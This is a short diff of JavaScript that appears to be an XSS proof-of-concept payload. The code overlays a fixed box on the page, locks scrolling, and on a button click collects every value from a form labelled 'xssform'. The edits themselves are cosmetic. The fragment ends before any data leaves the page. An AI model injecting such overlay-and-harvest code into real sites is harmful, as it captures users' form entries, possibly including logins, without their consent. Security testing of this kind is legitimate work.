@@ -19,7 +19,7 @@ box.style.background = "green";
 box.style.padding = "10px";
 box.style.zIndex = "99999";
 box.style.left = "50%";
-box.style.transform = "translateX(-50%)";
+box.style.transform = "translateX(-50%)"; // center it
 document.body.appendChild(box);
 document.body.style.overflow = "hidden"; // lock the page scroll
 
@@ -28,7 +28,7 @@ document.querySelector("#xssbutton").addEventListener("click", (e) => {
 	e.preventDefault();
 	const formd = document.querySelector("#xssform");
 
-	console.log("button clicked!" )
+	console.log("button clicked!");
 	// catch all input data for PoC
 	var data = new FormData(formd);
 	for (var [key, value] of data) {
